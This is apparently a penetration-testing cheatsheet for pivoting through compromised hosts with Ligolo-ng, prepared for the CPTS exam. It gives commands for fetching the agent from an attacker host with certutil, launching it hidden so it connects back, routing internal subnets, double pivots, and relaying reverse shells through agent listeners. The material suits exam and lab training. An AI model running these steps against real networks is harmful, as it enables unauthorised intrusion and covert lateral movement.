# 🐧 Ligolo-ng Cheatsheet

Pivoting through compromised hosts — setup, usage, multi-subnet routing. Built for CPTS exam use.

[1. Setup](#setup) [2. Running](#run) [3. Session control](#session) [4. Multiple subnets](#multi) [5. Double pivot](#double) [6. Agent-side listeners](#listener) [7. Troubleshooting](#trouble)

## 1.Setup

### On Linux (attacker box)

Create the TUN interface

```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

Only needs to be done once per attack box (survives until reboot). If you restart Kali, redo this.

### Get the binaries

Download matching release from `github.com/nicocha30/ligolo-ng` — grab **proxy** (Linux) and **agent** (Windows/Linux, matching target OS/arch).

```
which proxy agent 2>/dev/null || echo "place proxy + agent binaries in PATH or cwd"
```

## 2.Running it

### Linux — start the proxy attacker

```
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

`-selfcert` auto-generates a self-signed cert — fine for exam/lab. Change `-laddr` port if 11601 is blocked/used.

### Windows — run the agent target

```
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

Transfer via `certutil -urlcache -f http://<KALI_IP>/agent.exe agent.exe` or `iwr`/SMB if no internet egress.

### Run it backgrounded on Windows

Preferred — detaches cleanly, doesn't block your shell

```
Start-Process -WindowStyle Hidden -FilePath ".\agent.exe" -ArgumentList "-connect <KALI_IP>:11601 -ignore-cert"
```

Fully detached alternative (not a child of current shell)

```
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="C:\path\agent.exe -connect <KALI_IP>:11601 -ignore-cert"}
```

⚠️ Avoid `cmd /c start /b` through a non-interactive shell (e.g. Evil-WinRM) — it can hang the connection rather than truly backgrounding.

### Linux agent (if pivoting from a compromised Linux box)

```
nohup ./agent -connect <KALI_IP>:11601 -ignore-cert &
disown
```

## 3.Session control (on the proxy console)

| Command | What it does |
| --- | --- |
| `session` | List connected agents, select one by number |
| `start` | Activate tunnel for the selected agent session |
| `back` / Ctrl+C | Return to main prompt without killing the session |
| `ifconfig` | (inside agent session) show target's network interfaces — key for finding internal subnets |

Backgrounding a session (`back`) does **not** kill the tunnel — it stays active until the agent process dies or loses connectivity.

## 4.Multiple internal subnets

This is the key CPTS skill: a compromised host is often dual/multi-homed. Route *each* subnet you discover separately.

### Step 1 — enumerate the target's interfaces

```
# In the agent session on the proxy console
[Agent] » ifconfig
```

Or straight from a shell on the compromised host:

```
ipconfig        # Windows
ip a            # Linux
```

Note every NIC's subnet — e.g. `172.16.6.0/16` (DMZ/current pivot) and `10.50.10.0/24` (a second internal network only this box can see).

### Step 2 — add a route per subnet, all pointing at the same `ligolo` interface

```
sudo ip route add 172.16.6.0/24 dev ligolo
sudo ip route add 10.50.10.0/24 dev ligolo
sudo ip route add 192.168.100.0/24 dev ligolo
```

You can add as many as needed — one `ip route add` per subnet discovered, no limit. All traffic for all of them tunnels through the single active agent session.

### Step 3 — verify & scan each

```
ip route | grep ligolo
nxc smb 172.16.6.0/24
nxc smb 10.50.10.0/24
```

💡 If a newly discovered subnet is only reachable from a *second* pivot box (not your first agent), that's a **double pivot** — see section 5, not just another route.

## 5.Double pivot (pivot through a pivot)

When subnet B is only visible from a box you can only reach *through* subnet A (no direct line from Kali):

1. Get code execution on the second-hop host (inside subnet A, reachable via your first tunnel).
2. Transfer the **agent** binary to that second host through the existing tunnel (e.g. SMB/HTTP serve via the first pivot, or `evil-winrm upload`).
3. Run the agent on host 2, connecting back to the *same* Kali proxy IP/port:

   ```
   .\agent.exe -connect <KALI_IP>:11601 -ignore-cert
   ```
4. On the proxy console: `session` → select the new agent → `start`.
5. Add a route for subnet B, same as before:

   ```
   sudo ip route add <subnet_B>/24 dev ligolo
   ```

Both tunnels run concurrently off the same `ligolo` TUN interface — the proxy handles routing packets to whichever agent session owns that subnet.

## 6.Agent-side listeners (exposing internal ports back to you)

Useful for catching reverse shells from the internal network, or relaying a service (e.g. internal web app) back to your Kali box.

```
# Inside the agent session on the proxy console
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

Then point internal-network payloads at the **agent host's** IP on that port — traffic gets relayed back through the tunnel to your listener on Kali.

## 7.Troubleshooting

| Symptom | Likely cause / fix |
| --- | --- |
| Scans through tunnel return nothing (even hosts that worked before) | Tunnel/route issue, not target issue. Check `ip route \| grep ligolo` and `ip a show ligolo`; re-add route if missing. |
| Lab/VPN reset — new attack IP, new agent ID | Old session is dead. Re-run the agent on target, re-select in `session`, re-run `start`, and re-confirm/re-add routes — they don't persist automatically. |
| One specific host unreachable, rest of subnet fine | Target-side issue (reboot, firewall, down) — not Ligolo. Confirm via `nxc smb <subnet>/24` showing other hosts responding fine. |
| `agent already connected, rejecting duplicate` | You launched a second `agent.exe` on the same host. Harmless but redundant — `Get-Process agent` then `Stop-Process -Id <pid>` to clean up the extra. |
| No ICMP (ping) through tunnel | ICMP needs raw sockets — make sure `proxy` is run as root/sudo. |

Ligolo-ng cheatsheet — adjust IPs/ports to match your exam environment.